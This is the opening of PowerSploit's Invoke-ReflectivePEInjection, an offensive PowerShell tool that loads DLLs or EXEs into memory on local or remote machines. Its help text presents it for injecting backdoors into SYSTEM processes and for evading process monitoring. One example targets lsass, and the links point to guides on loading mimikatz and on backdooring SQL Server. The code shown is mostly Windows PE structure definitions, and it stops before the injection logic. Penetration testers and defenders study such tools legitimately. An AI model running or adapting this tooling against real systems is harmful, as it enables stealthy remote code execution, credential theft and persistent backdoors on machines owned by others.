function Invoke-ReflectivePEInjection
{
<#
.SYNOPSIS

This script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process,
or it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints,
please lead the Notes section (GENERAL NOTES) for information on how to use them.

1.)Reflectively loads a DLL or EXE in to memory of the Powershell process.
Because the DLL/EXE is loaded reflectively, it is not displayed when tools are used to list the DLLs of a running process.

This tool can be run on remote servers by supplying a local Windows PE file (DLL/EXE) to load in to memory on the remote system,
this will load and execute the DLL/EXE in to memory without writing any files to disk.

2.) Reflectively load a DLL in to memory of a remote process.
As mentioned above, the DLL being reflectively loaded won't be displayed when tools are used to list DLLs of the running remote process.

This is probably most useful for injecting backdoors in SYSTEM processes in Session0. Currently, you cannot retrieve output
from the DLL. The script doesn't wait for the DLL to complete execution, and doesn't make any effort to cleanup memory in the
remote process.

PowerSploit Function: Invoke-ReflectivePEInjection
Author: Joe Bialek, Twitter: @JosephBialek
Code review and modifications: Matt Graeber, Twitter: @mattifestation
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process.

.PARAMETER PEBytes

A byte array containing a DLL/EXE to load and execute.

.PARAMETER ComputerName

Optional, an array of computernames to run the script on.

.PARAMETER FuncReturnType

Optional, the return type of the function being called in the DLL. Default: Void
    Options: String, WString, Void. See notes for more information.
    IMPORTANT: For DLLs being loaded remotely, only Void is supported.

.PARAMETER ExeArgs

Optional, arguments to pass to the executable being reflectively loaded.

.PARAMETER ProcName

Optional, the name of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

.PARAMETER ProcId

Optional, the process ID of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

.PARAMETER ForceASLR

Optional, will force the use of ASLR on the PE being loaded even if the PE indicates it doesn't support ASLR. Some PE's will work with ASLR even
    if the compiler flags don't indicate they support it. Other PE's will simply crash. Make sure to test this prior to using. Has no effect when
    loading in to a remote process.

.PARAMETER DoNotZeroMZ

Optional, will not wipe the MZ from the first two bytes of the PE. This is to be used primarily for testing purposes and to enable loading the same PE with Invoke-ReflectivePEInjection more than once.

.EXAMPLE

Load DemoDLL and run the exported function WStringFunc on Target.local, print the wchar_t* returned by WStringFunc().
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL.dll')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName Target.local

.EXAMPLE

Load DemoDLL and run the exported function WStringFunc on all computers in the file targetlist.txt. Print
    the wchar_t* returned by WStringFunc() from all the computers.
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL.dll')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)

.EXAMPLE

Load DemoEXE and run it locally.
$PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4"

.EXAMPLE

Load DemoEXE and run it locally. Forces ASLR on for the EXE.
$PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4" -ForceASLR

.EXAMPLE

Refectively load DemoDLL_RemoteProcess.dll in to the lsass process on a remote computer.
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL_RemoteProcess.dll')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcName lsass -ComputerName Target.Local

.NOTES
GENERAL NOTES:
The script has 3 basic sets of functionality:
1.) Reflectively load a DLL in to the PowerShell process
    -Can return DLL output to user when run remotely or locally.
    -Cleans up memory in the PS process once the DLL finishes executing.
    -Great for running pentest tools on remote computers without triggering process monitoring alerts.
    -By default, takes 3 function names, see below (DLL LOADING NOTES) for more info.
2.) Reflectively load an EXE in to the PowerShell process.
    -Can NOT return EXE output to user when run remotely. If remote output is needed, you must use a DLL. CAN return EXE output if run locally.
    -Cleans up memory in the PS process once the DLL finishes executing.
    -Great for running existing pentest tools which are EXE's without triggering process monitoring alerts.
3.) Reflectively inject a DLL in to a remote process.
    -Can NOT return DLL output to the user when run remotely OR locally.
    -Does NOT clean up memory in the remote process if/when DLL finishes execution.
    -Great for planting backdoor on a system by injecting backdoor DLL in to another processes memory.
    -Expects the DLL to have this function: void VoidFunc(). This is the function that will be called after the DLL is loaded.

DLL LOADING NOTES:

PowerShell does not capture an applications output if it is output using stdout, which is how Windows console apps output.
If you need to get back the output from the PE file you are loading on remote computers, you must compile the PE file as a DLL, and have the DLL
return a char* or wchar_t*, which PowerShell can take and read the output from. Anything output from stdout which is run using powershell
remoting will not be returned to you. If you just run the PowerShell script locally, you WILL be able to see the stdout output from
applications because it will just appear in the console window. The limitation only applies when using PowerShell remoting.

For DLL Loading:
Once this script loads the DLL, it calls a function in the DLL. There is a section near the bottom labeled "YOUR CODE GOES HERE"
I recommend your DLL take no parameters. I have prewritten code to handle functions which take no parameters are return
the following types: char*, wchar_t*, and void. If the function returns char* or wchar_t* the script will output the
returned data. The FuncReturnType parameter can be used to specify which return type to use. The mapping is as follows:
wchar_t*   : FuncReturnType = WString
char*      : FuncReturnType = String
void       : Default, don't supply a FuncReturnType

For the whcar_t* and char_t* options to work, you must allocate the string to the heap. Don't simply convert a string
using string.c_str() because it will be allocaed on the stack and be destroyed when the DLL returns.

The function name expected in the DLL for the prewritten FuncReturnType's is as follows:
WString    : WStringFunc
String     : StringFunc
Void       : VoidFunc

These function names ARE case sensitive. To create an exported DLL function for the wstring type, the function would
be declared as follows:
extern "C" __declspec( dllexport ) wchar_t* WStringFunc()


If you want to use a DLL which returns a different data type, or which takes parameters, you will need to modify
this script to accomodate this. You can find the code to modify in the section labeled "YOUR CODE GOES HERE".

Find a DemoDLL at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectiveDllInjection

.LINK

http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/

Blog on modifying mimikatz for reflective loading: http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
Blog on using this script as a backdoor with SQL server: http://www.casaba.com/blog/
#>

[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseSingularNouns', '')]
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSPossibleIncorrectComparisonWithNull', '')]
[CmdletBinding()]
Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $PEBytes,

    [Parameter(Position = 1)]
    [String[]]
    $ComputerName,

    [Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
    [String]
    $FuncReturnType = 'Void',

    [Parameter(Position = 3)]
    [String]
    $ExeArgs,

    [Parameter(Position = 4)]
    [Int32]
    $ProcId,

    [Parameter(Position = 5)]
    [String]
    $ProcName,

    [Switch]
    $ForceASLR,

    [Switch]
    $DoNotZeroMZ
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $PEBytes,

        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FuncReturnType,

        [Parameter(Position = 2, Mandatory = $true)]
        [Int32]
        $ProcId,

        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
    )

    ###################################
    ##########  Win32 Stuff  ##########
    ###################################
    Function Get-Win32Types
    {
        $Win32Types = New-Object System.Object

        #Define all the structures/enums that will be used
        #   This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
        $Domain = [AppDomain]::CurrentDomain
        $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
        $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


        ############    ENUM    ############
        #Enum MachineType
        $TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
        $TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
        $MachineType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

        #Enum MagicType
        $TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
        $MagicType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

        #Enum SubSystemType
        $TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
        $SubSystemType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

        #Enum DllCharacteristicsType
        $TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
        $TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
        $TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
        $TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
        $TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
        $DllCharacteristicsType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

        ###########    STRUCT    ###########
        #Struct IMAGE_DATA_DIRECTORY
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
        ($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
        $IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

        #Struct IMAGE_FILE_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
        $IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

        #Struct IMAGE_OPTIONAL_HEADER64
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
        $IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

        #Struct IMAGE_OPTIONAL_HEADER32
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        $IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

        #Struct IMAGE_NT_HEADERS64
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
        $IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64

        #Struct IMAGE_NT_HEADERS32
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
        $IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

        #Struct IMAGE_DOS_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
        $TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

        $e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
        $e_resField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

        $e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
        $e_res2Field.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
